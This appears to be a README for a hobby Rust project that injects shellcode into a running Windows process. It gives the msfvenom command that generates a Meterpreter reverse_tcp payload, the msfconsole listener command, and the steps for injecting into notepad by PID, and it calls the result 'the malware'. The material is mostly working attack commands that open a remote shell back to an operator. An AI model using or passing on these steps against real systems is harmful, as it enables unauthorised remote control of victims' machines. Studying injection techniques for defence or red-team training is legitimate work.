# Shellcode Injection in Rust

## In this project I want to conduct the most common process injection technique - Shellcode Injection. As you notice I am doing it in the Rust to practice this amazing language :)

### Creating the payload (default meterpreter)
```cmd
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f rust
```

### Firing up the listener
```cmd
$ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 443; run"
```

### Running the malware on the target machine. For this you need to define the PID of the target process. I will use notepad
```cmd
tasklist | findstr notepad
notepad.exe 9300    Console 1   17,356 K
.\shellcode_injection.exe 9300
```
